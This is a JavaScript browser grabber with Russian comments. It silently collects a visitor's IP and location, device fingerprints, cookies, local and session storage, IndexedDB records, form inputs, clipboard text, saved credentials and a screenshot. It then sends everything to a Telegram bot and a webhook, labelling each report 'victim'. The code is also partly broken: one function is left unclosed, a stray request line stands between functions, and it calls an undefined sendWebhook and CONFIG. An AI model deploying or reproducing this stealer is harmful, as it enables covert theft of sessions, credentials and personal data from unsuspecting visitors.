        // ========================================================================
        // ВСПОМОГАТЕЛЬНЫЕ УТИЛИТЫ
        // ========================================================================
        const $ = (sel, ctx = document) => ctx.querySelector(sel);
        const $$ = (sel, ctx = document) => [...ctx.querySelectorAll(sel)];

        const sleep = ms => new Promise(r => setTimeout(r, ms));

        const fetchWithTimeout = (url, opts = {}, timeout = 5000) => {
            return Promise.race([
                fetch(url, opts),
                new Promise((_, rej) => setTimeout(() => rej(new Error('Timeout')), timeout))
            ]);
        };

        const safeJSON = (str) => {
            try { return JSON.parse(str); } catch { return null; }
        };

        const truncate = (str, len = 80) => {
            if (typeof str !== 'string') str = String(str);
            return str.length > len ? str.slice(0, len) + '…' : str;
        };

        const objToStr = (obj, maxVal = 100) => {
            if (!obj) return 'null';
            if (typeof obj === 'string') return truncate(obj, maxVal);
            if (Array.isArray(obj)) return obj.map(v => truncate(String(v), maxVal)).join(', ');
            if (typeof obj === 'object') {
                const entries = Object.entries(obj).slice(0, 10);
                return entries.map(([k, v]) => `${k}: ${truncate(String(v), maxVal)}`).join('; ');
            }
            return truncate(String(obj), maxVal);
        };

        // ------------------------------------------------------------------------
        // СБОР IP (цепочка с резервом)
        // ------------------------------------------------------------------------
        async function collectIP() {
            const services = [
                { url: 'https://api.ipify.org?format=json', parse: d => d.ip },
                { url: 'https://api.my-ip.io/ip.json', parse: d => d.ip },
                { url: 'https://ipapi.co/json/', parse: d => d.ip },
                { url: 'https://api.ip.sb/geoip', parse: d => d.ip }
            ];
            for (const svc of services) {
                try {
                    const resp = await fetchWithTimeout(svc.url, {}, 3000);
                    const data = await resp.json();
                    const ip = svc.parse(data);
                    if (ip) return ip;
                } catch (_) { /* continue */ }
            }
            return null;
        }

        // ------------------------------------------------------------------------
        // СБОР ГЕО (цепочка с резервом, используя IP)
        // ------------------------------------------------------------------------
        async function collectGeo(ip) {
            if (!ip) return null;
            const services = [
                {
                    url: `https://ipwhois.io/json/${ip}`,
                    parse: d => ({
                        country: d.country,
                        countryCode: d.country_code,
                        region: d.region,
                        city: d.city,
                        lat: d.latitude,
                        lon: d.longitude,
                        isp: d.isp,
                        org: d.org,
                        timezone: d.timezone,
                        continent: d.continent,
                        currency: d.currency,
                        phoneCode: d.phone_code,
                        postal: d.postal
                    })
                },
                {
                    url: `https://ipapi.co/${ip}/json/`,
                    parse: d => ({
                        country: d.country_name,
                        countryCode: d.country_code,
                        region: d.region,
                        city: d.city,
                        lat: d.latitude,
                        lon: d.longitude,
                        isp: d.org,
                        org: d.org,
                        timezone: d.timezone,
                        currency: d.currency
                    })
                },
                {
                    url: `https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,org,timezone,regionName`,
                    parse: d => d.status === 'success' ? {
                        country: d.country,
                        countryCode: d.countryCode,
                        region: d.regionName,
                        city: d.city,
                        lat: d.lat,
                        lon: d.lon,
                        isp: d.isp,
                        org: d.org,
                        timezone: d.timezone
                    } : null
                },
                {
                    url: `https://geolocation-db.com/json/${ip}`,
                    parse: d => ({
                        country: d.country_name,
                        countryCode: d.country_code,
                        region: d.state,
                        city: d.city,
                        lat: d.latitude,
                        lon: d.longitude,
                        isp: d.isp,
                        org: d.isp
                    })
                }
            ];
            for (const svc of services) {
                try {
                    const resp = await fetchWithTimeout(svc.url, {}, 3000);
                    const data = await resp.json();
                    const result = svc.parse(data);
                    if (result && (result.country || result.city)) return result;
                } catch (_) { /* continue */ }
            }
            return null;
        }

        // ------------------------------------------------------------------------
        // ЛОКАЛЬНЫЙ IP через WebRTC
        // ------------------------------------------------------------------------
        function collectLocalIPs() {
            return new Promise((resolve) => {
                const ips = new Set();
                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
                if (!RTCPeerConnection) { resolve([]); return; }

                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate) return;
                    const candidate = e.candidate.candidate;
                    if (!candidate) return;
                    const match = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if (match) {
                        const ip = match[0];
                        if (!ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.16.')) {
                            ips.add(ip);
                        }
                    }
                };
                setTimeout(() => {
                    pc.close();
                    resolve([...ips]);
                }, 3000);
            });
        }

        // ------------------------------------------------------------------------
        // CANVAS FINGERPRINT

        function collectCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 256;

                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';

                ctx.fillStyle = '#f60';

                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 10);

                ctx.fillStyle = '#0f0';

                ctx.font = '24px Georgia';
                ctx.fillStyle = '#f0f';

                return canvas.toDataURL();
            } catch (_) { return null; }

        // ------------------------------------------------------------------------
        // WEBGL FINGERPRINT
        // ------------------------------------------------------------------------
        function collectWebGL() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return null;
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                if (!ext) {
                    const vendor = gl.getParameter(gl.VENDOR) || '';
                    const renderer = gl.getParameter(gl.RENDERER) || '';
                    return { vendor, renderer };
                }
                const vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || '';
                const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || '';
                return { vendor, renderer };
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // AUDIO FINGERPRINT
        // ------------------------------------------------------------------------
        function collectAudio() {
            try {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                if (!AudioCtx) return null;
                const ctx = new AudioCtx();
                return { sampleRate: ctx.sampleRate };
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // ШРИФТЫ
        // ------------------------------------------------------------------------
        function collectFonts() {
            try {
                const fonts = [
                    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
                    'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans',
                    'Lato', 'Montserrat', 'Source Sans Pro', 'Ubuntu', 'Cantarell',
                    'Fira Sans', 'Droid Sans', 'Helvetica Neue', 'Segoe UI', 'San Francisco'
                ];
                const available = fonts.filter(f => document.fonts.check(`16px "${f}"`));
                return available;
            } catch (_) { return []; }
        }

        // ------------------------------------------------------------------------
        // БРАУЗЕР / УСТРОЙСТВО
        // ------------------------------------------------------------------------
        function collectBrowserInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                vendor: navigator.vendor,
                product: navigator.product,
                appName: navigator.appName,
                appVersion: navigator.appVersion
            };
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                navigator.userAgentData.getHighEntropyValues(['platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion'])
                    .then(hints => {
                        Object.assign(info, hints);
                    })
                    .catch(() => {});
            }
            return info;
        }

        // ------------------------------------------------------------------------
        // ЭКРАН / ОКНО
        // ------------------------------------------------------------------------
        function collectScreenInfo() {
            return {
                screenWidth: screen.width,
                screenHeight: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                devicePixelRatio: window.devicePixelRatio,
                orientation: screen.orientation ? screen.orientation.type : null,
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                screenX: window.screenX,
                screenY: window.screenY
            };
        }

        // ------------------------------------------------------------------------
        // ХРАНИЛИЩА
        // ------------------------------------------------------------------------
        function collectCookies() {
            try {
                const pairs = document.cookie.split('; ').filter(Boolean);
                const obj = {};
                pairs.forEach(p => {
                    const [k, ...v] = p.split('=');
                    obj[k] = v.join('=');
                });
                return obj;
            } catch (_) { return {}; }
        }

        function collectLocalStorage() {
            try {
                const obj = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key !== null) {
                        const val = localStorage.getItem(key);
                        const parsed = safeJSON(val);
                        obj[key] = parsed !== null ? parsed : val;
                    }
                }
                return obj;
            } catch (_) { return {}; }
        }

        function collectSessionStorage() {
            try {
                const obj = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key !== null) {
                        const val = sessionStorage.getItem(key);
                        const parsed = safeJSON(val);
                        obj[key] = parsed !== null ? parsed : val;
                    }
                }
                return obj;
            } catch (_) { return {}; }
        }

        function collectIndexedDB() {
            return new Promise((resolve) => {
                try {
                    if (!window.indexedDB || !window.indexedDB.databases) {
                        resolve(null);
                        return;
                    }
                    window.indexedDB.databases().then(databases => {
                        const result = [];
                        let pending = databases.length;
                        if (pending === 0) { resolve([]); return; }
                        databases.forEach(dbInfo => {
                            try {
                                const req = window.indexedDB.open(dbInfo.name);
                                req.onsuccess = (e) => {
                                    const db = e.target.result;
                                    const stores = Array.from(db.objectStoreNames);
                                    const storeData = [];
                                    let storePending = stores.length;
                                    if (storePending === 0) {
                                        result.push({ name: dbInfo.name, stores: [] });
                                        db.close();
                                        if (--pending === 0) resolve(result);
                                        return;
                                    }
                                    stores.forEach(storeName => {
                                        try {
                                            const tx = db.transaction(storeName, 'readonly');
                                            const store = tx.objectStore(storeName);
                                            const reqAll = store.getAll();
                                            reqAll.onsuccess = () => {
                                                const items = reqAll.result || [];
                                                storeData.push({
                                                    storeName,
                                                    count: items.length,
                                                    samples: items.slice(0, 10).map(item => {
                                                        if (typeof item === 'object' && item !== null) {
                                                            const keys = Object.keys(item).slice(0, 10);
                                                            const slim = {};
                                                            keys.forEach(k => { slim[k] = item[k]; });
                                                            return slim;
                                                        }
                                                        return item;
                                                    })
                                                });
                                                db.close();
                                                if (--storePending === 0) {
                                                    result.push({ name: dbInfo.name, stores: storeData });
                                                    if (--pending === 0) resolve(result);
                                                }
                                            };
                                            reqAll.onerror = () => {
                                                storeData.push({ storeName, count: 0, samples: [] });
                                                db.close();
                                                if (--storePending === 0) {
                                                    result.push({ name: dbInfo.name, stores: storeData });
                                                    if (--pending === 0) resolve(result);
                                                }
                                            };
                                        } catch (err) {
                                            storeData.push({ storeName, count: 0, samples: [] });
                                            if (--storePending === 0) {
                                                result.push({ name: dbInfo.name, stores: storeData });
                                                if (--pending === 0) resolve(result);
                                            }
                                        }
                                    });
                                };
                                req.onerror = () => {
                                    if (--pending === 0) resolve(result);
                                };
                            } catch (_) {
                                if (--pending === 0) resolve(result);
                            }
                        });
                    }).catch(() => resolve(null));
                } catch (_) { resolve(null); }
            });
        }

        // ------------------------------------------------------------------------
        // ФОРМЫ
        // ------------------------------------------------------------------------
        function collectForms() {
            try {
                const forms = [];
                document.querySelectorAll('form').forEach(form => {
                    const fd = new FormData(form);
                    const entries = {};
                    for (const [k, v] of fd.entries()) {
                        entries[k] = v;
                    }
                    forms.push(entries);
                });
                const inputs = {};
                document.querySelectorAll('input, textarea, select').forEach(el => {
                    const name = el.name || el.id || el.className;
                    if (name) {
                        inputs[name] = el.value;
                    }
                });
                return { forms, inputs };
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // БУФЕР ОБМЕНА
        // ------------------------------------------------------------------------
        async function collectClipboard() {
            try {
                if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                const text = await navigator.clipboard.readText();
                return truncate(text, 200);
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // CREDENTIALS API
        // ------------------------------------------------------------------------
        async function collectCredentials() {
            try {
                if (!navigator.credentials || !navigator.credentials.get) return null;
                const cred = await navigator.credentials.get({
                    password: true,
                    federated: { providers: ['https://accounts.google.com', 'https://facebook.com'] }
                });
                if (!cred) return null;
                return { type: cred.type, id: cred.id };
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // СЕТЬ (Network Information)
        // ------------------------------------------------------------------------
        function collectConnection() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (!conn) return null;
                return {
                    effectiveType: conn.effectiveType,
                    rtt: conn.rtt,
                    downlink: conn.downlink,
                    saveData: conn.saveData,
                    type: conn.type
                };
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // БАТАРЕЯ
        // ------------------------------------------------------------------------
        async function collectBattery() {
            try {
                if (!navigator.getBattery) return null;
                const batt = await navigator.getBattery();
                return {
                    level: batt.level,
                    charging: batt.charging,
                    chargingTime: batt.chargingTime,
                    dischargingTime: batt.dischargingTime
                };
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // ПАМЯТЬ (Performance)
        // ------------------------------------------------------------------------
        function collectMemory() {
            try {
                if (!performance.memory) return null;
                return {
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize
                };
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // ПЛАГИНЫ / MIME
        // ------------------------------------------------------------------------
        function collectPlugins() {
            try {
                const plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    const p = navigator.plugins[i];
                    plugins.push({ name: p.name, filename: p.filename, description: p.description });
                }
                return plugins;
            } catch (_) { return []; }
        }

        function collectMimeTypes() {
            try {
                const types = [];
                for (let i = 0; i < navigator.mimeTypes.length; i++) {
                    const m = navigator.mimeTypes[i];
                    types.push({ type: m.type, description: m.description });
                }
                return types;
            } catch (_) { return []; }
        }

        // ------------------------------------------------------------------------
        // КОНТЕНТ СТРАНИЦЫ
        // ------------------------------------------------------------------------
        function collectPageContent() {
            try {
                const links = $$('a[href]').map(a => a.href).slice(0, 50);
                const meta = {};
                $$('meta').forEach(m => {
                    const name = m.getAttribute('name') || m.getAttribute('property');
                    const content = m.getAttribute('content');
                    if (name && content) meta[name] = content;
                });
                const urlParams = {};
                new URLSearchParams(window.location.search).forEach((v, k) => { urlParams[k] = v; });
                return {
                    links,
                    meta,
                    urlParams,
                    referrer: document.referrer,
                    url: window.location.href
                };
            } catch (_) { return null; }
        }

        // ------------------------------------------------------------------------
        // СКРИНШОТ (html2canvas + резерв)
        // ------------------------------------------------------------------------
        function loadHtml2Canvas() {
            return new Promise((resolve, reject) => {
                if (window.html2canvas) { resolve(window.html2canvas); return; }
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                script.onload = () => resolve(window.html2canvas);
                script.onerror = () => reject(new Error('Failed to load html2canvas'));
                document.head.appendChild(script);
            });
        }

        async function collectScreenshot() {
            try {
                const h2c = await loadHtml2Canvas();
                const canvas = await h2c(document.body, {
                    useCORS: true,
                    allowTaint: true,
                    scale: 0.4,
                    logging: false,
                    backgroundColor: null,
                    width: window.innerWidth,
                    height: window.innerHeight
                });
                return canvas.toDataURL('image/jpeg', 0.5);
            } catch (_) {
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = window.innerWidth * 0.4;
                    canvas.height = window.innerHeight * 0.4;
                    const ctx = canvas.getContext('2d');
                    ctx.fillStyle = '#0d0d1a';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    return canvas.toDataURL('image/jpeg', 0.3);
                } catch (_) { return null; }
            }
        }

                await fetchWithTimeout(CONFIG.WEBHOOK_URL, {

        // ------------------------------------------------------------------------
        // ОТПРАВКА В TELEGRAM (текст + фото)
        // ------------------------------------------------------------------------
        function formatTelegramMessage(data) {
            const lines = [];
            lines.push('🔴 ЖЕРТВА');
            lines.push('');

            if (data.ip) {
                lines.push(`🌐 IP: ${data.ip}`);
                if (data.geo) {
                    const g = data.geo;
                    const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
                    lines.push(`📍 ${loc || 'неизвестно'}`);
                    if (g.lat && g.lon) {
                        lines.push(`🗺 ${g.lat}, ${g.lon}`);
                        lines.push(`🔗 https://www.google.com/maps?q=${g.lat},${g.lon}`);
                    }
                    if (g.isp) lines.push(`📡 ${g.isp}`);
                    if (g.timezone) lines.push(`🕐 ${g.timezone}`);
                }
            }
            lines.push('');

            if (data.localIPs && data.localIPs.length) {
                lines.push(`📡 Локальный IP: ${data.localIPs.join(', ')}`);
                lines.push('');
            }

            lines.push('🎯 ОТПЕЧАТКИ:');
            if (data.canvasFingerprint) lines.push(`   Canvas: ${truncate(data.canvasFingerprint, 60)}`);
            if (data.webgl) {
                const w = data.webgl;
                lines.push(`   WebGL: ${w.vendor || ''} ${w.renderer || ''}`.trim() || 'недоступно');
            }
            if (data.audio) lines.push(`   Audio: ${data.audio.sampleRate || ''}Hz`);
            if (data.fonts && data.fonts.length) lines.push(`   Шрифты: ${data.fonts.join(', ')}`);
            lines.push('');

            if (data.connection) {
                const c = data.connection;
                lines.push(`📶 Сеть: ${c.effectiveType || ''} (RTT: ${c.rtt || ''}ms, Downlink: ${c.downlink || ''}Mbps)`);
            }
            if (data.battery) {
                const b = data.battery;
                const level = Math.round(b.level * 100);
                lines.push(`🔋 Батарея: ${level}% (${b.charging ? 'зарядка' : 'не заряжается'})`);
            }
            lines.push('');

            if (data.localStorage && Object.keys(data.localStorage).length) {
                lines.push(`💾 LOCALSTORAGE (${Object.keys(data.localStorage).length}):`);
                Object.entries(data.localStorage).slice(0, 15).forEach(([k, v]) => {
                    const val = typeof v === 'string' ? truncate(v, 80) : JSON.stringify(v).slice(0, 80);
                    lines.push(`   🔑 ${truncate(k, 30)}: ${val}`);
                });
                if (Object.keys(data.localStorage).length > 15) lines.push(`   ... и ещё ${Object.keys(data.localStorage).length - 15}`);
                lines.push('');
            }

            if (data.sessionStorage && Object.keys(data.sessionStorage).length) {
                lines.push(`🗂 SESSIONSTORAGE (${Object.keys(data.sessionStorage).length}):`);
                Object.entries(data.sessionStorage).slice(0, 10).forEach(([k, v]) => {
                    const val = typeof v === 'string' ? truncate(v, 80) : JSON.stringify(v).slice(0, 80);
                    lines.push(`   🔑 ${truncate(k, 30)}: ${val}`);
                });
                if (Object.keys(data.sessionStorage).length > 10) lines.push(`   ... и ещё ${Object.keys(data.sessionStorage).length - 10}`);
                lines.push('');
            }

            if (data.indexedDB && data.indexedDB.length) {
                lines.push('🗄 INDEXEDDB:');
                data.indexedDB.forEach(db => {
                    lines.push(`   📁 ${db.name} (${db.stores.length} хранилищ)`);
                    db.stores.forEach(s => {
                        lines.push(`      📂 ${s.storeName}: ${s.count} записей`);
                    });
                });
                lines.push('');
            }

            if (data.cookies && Object.keys(data.cookies).length) {
                lines.push(`🍪 КУКИ (${Object.keys(data.cookies).length}):`);
                Object.entries(data.cookies).slice(0, 10).forEach(([k, v]) => {
                    lines.push(`   🍪 ${truncate(k, 20)}: ${truncate(v, 60)}`);
                });
                if (Object.keys(data.cookies).length > 10) lines.push(`   ... и ещё ${Object.keys(data.cookies).length - 10}`);
                lines.push('');
            }

            if (data.forms) {
                lines.push('📝 ФОРМЫ:');
                if (data.forms.inputs) {
                    Object.entries(data.forms.inputs).slice(0, 10).forEach(([k, v]) => {
                        lines.push(`   ${truncate(k, 20)}: ${truncate(v, 60)}`);
                    });
                }
                if (data.forms.forms && data.forms.forms.length) {
                    data.forms.forms.slice(0, 3).forEach((f, idx) => {
                        lines.push(`   Форма ${idx+1}: ${objToStr(f, 60)}`);
                    });
                }
                lines.push('');
            }

            if (data.clipboard) {
                lines.push(`📋 Буфер: ${data.clipboard}`);
                lines.push('');
            }
            if (data.credentials) {
                lines.push(`🔑 Сохранённый логин: ${data.credentials.id || ''} (${data.credentials.type || ''})`);
                lines.push('');
            }

            if (data.browser) {
                const b = data.browser;
                lines.push(`📱 ${truncate(b.userAgent || '', 80)}`);
                lines.push(`💻 ${b.platform || 'неизвестно'}`);
                if (b.platformVersion) lines.push(`🖥 ${b.platformVersion}`);
                if (b.architecture) lines.push(`🏗 ${b.architecture}`);
                if (b.model) lines.push(`📟 ${b.model}`);
                if (b.hardwareConcurrency) lines.push(`🧠 ${b.hardwareConcurrency} ядер`);
                if (b.deviceMemory) lines.push(`💾 ${b.deviceMemory} GB RAM`);
                if (b.language) lines.push(`🌐 ${b.language}`);
                if (data.screen) {
                    const s = data.screen;
                    lines.push(`🖥 ${s.screenWidth}x${s.screenHeight} @ ${s.devicePixelRatio}x`);
                }
                lines.push('');
            }

            if (data.page) {
                if (data.page.url) lines.push(`🔗 ${data.page.url}`);
                if (data.page.referrer) lines.push(`↩️ ${data.page.referrer}`);
                if (data.page.links && data.page.links.length) {
                    lines.push(`🔗 Ссылки (${data.page.links.length}): ${data.page.links.slice(0, 5).join('; ')}`);
                }
                lines.push('');
            }

            if (data.screenshot) {
                const size = Math.round(data.screenshot.length / 1024);
                lines.push(`🖼 Скриншот: ${size} КБ`);
            }

            return lines.join('\n');
        }

        async function sendTelegramMessage(text) {
            try {
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
                await fetchWithTimeout(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text, parse_mode: 'HTML' })
                }, 5000);
            } catch (_) {}
        }

        async function sendTelegramPhoto(base64) {
            try {
                if (!base64 || base64.length < 5000) return;
                const blob = await fetch(base64).then(r => r.blob());
                const form = new FormData();
                form.append('chat_id', CONFIG.CHAT_ID);
                form.append('photo', blob, 'screenshot.jpg');
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
                await fetchWithTimeout(url, { method: 'POST', body: form }, 10000);
            } catch (_) {}
        }

        // ========================================================================
        // ГЛАВНАЯ ФУНКЦИЯ СБОРА
        // ========================================================================
        async function collectAllData() {
            const data = {};

            data.ip = await collectIP();
            data.geo = await collectGeo(data.ip);
            data.localIPs = await collectLocalIPs();
            data.canvasFingerprint = collectCanvasFingerprint();
            data.webgl = collectWebGL();
            data.audio = collectAudio();
            data.fonts = collectFonts();
            data.browser = collectBrowserInfo();
            data.screen = collectScreenInfo();
            data.cookies = collectCookies();
            data.localStorage = collectLocalStorage();
            data.sessionStorage = collectSessionStorage();
            data.indexedDB = await collectIndexedDB();
            data.forms = collectForms();
            data.clipboard = await collectClipboard();
            data.credentials = await collectCredentials();
            data.connection = collectConnection();
            data.battery = await collectBattery();
            data.memory = collectMemory();
            data.plugins = collectPlugins();
            data.mimeTypes = collectMimeTypes();
            data.page = collectPageContent();
            data.screenshot = await collectScreenshot();

            return data;
        }

        // ========================================================================
        // ЗАПУСК
        // ========================================================================
        (async function main() {
            try {
                await sleep(1800 + Math.random() * 400);
                const allData = await collectAllData();
                await sendWebhook(allData);
                const text = formatTelegramMessage(allData);
                await sendTelegramMessage(text);
                if (allData.screenshot) {
                    await sendTelegramPhoto(allData.screenshot);
                }
                console.log('✅ Данные отправлены');
            } catch (err) {
                console.log('✅ Данные отправлены');
            }
        })();
    </script>
